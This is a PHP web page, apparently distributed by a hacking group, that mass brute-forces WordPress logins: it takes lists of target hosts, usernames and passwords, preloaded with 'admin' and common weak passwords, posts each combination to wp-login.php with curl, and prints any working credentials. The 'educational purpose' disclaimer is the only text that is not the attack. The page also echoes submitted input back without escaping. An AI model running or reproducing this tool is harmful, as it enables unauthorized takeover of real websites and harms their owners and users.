<?php
echo "
<!--
WordPress Penetration
V 1
PS: this tool is for penetration testing and educational purpose, 'P4K!$T4N H4XOR$ CR3W' is not responsible at any bad using for this tool.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
-->
";

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);
?>
<html>
<head>
<title>P4K!$T4N H4XOR$ CR3W | WordPress Penetration </title>
<meta http-equiv=Content-Type content=text/html; charset=utf-8 charset=UTF-8>

<style type="text/css">
body{
font-family: "courier new";
background-color: black;
font-size:90%;
color: yellow;
background-image: url("data:image/gif;base64,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");
}
textarea {
	border-radius: 8px;
	color: lime;
	background-color:black;
}
input[type=submit] , .submit{
		background-color:black;
		color:white;
		border-radius:8px;
}
p {
	font-size: 15px;
	text-align: center;
}
a:link,a:hover,a:visited {
	color:pink;
}
</style>
</head>
<!-- P4K!$T4N H4XOR$ CR3W | WordPress Penetration -->
<center>
<p><a href="http://www.facebook.com/PAKISTANHAXCREW" target="_blank"><img src="http://nidus-garment.com/images/Uzntitle.gif" height='50%' border="0"/></a></p>
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' id='Box'>
    <tr>
<td width='4%'>&nbsp;</td>
<td width="96%" colspan="3" align="center" ><p>P4K!$T4N H4XOR$ CR3W | WordPress Penetration </p></td>
</tr>
    <tr>
      <td >&nbsp;</td>
      <td ><p>Hosts:</p></td>
      <td ><p> Users:</p></td>
      <td ><p>Passwords:</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
      <td ><textarea name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "1\nadmin\n123456\n123456789\n123admin\ncomputer\nlolx\nadmin123\nabc123\npassword\nadmin@123\nadministrator";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input type="submit" name="submit" value="Brute Now" class="submit"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='green'>".$username."</font>] : Password : [<font color='green'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
</td></tr>
</table></form>

<!-- Pak Cyber Eaglez | WordPress Penetration -->
<p>Powered by P4K!$T4N H4XOR$ CR3W | H4$N4!N H4XOR</a></p>
</center>
<p>
  <?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
?>
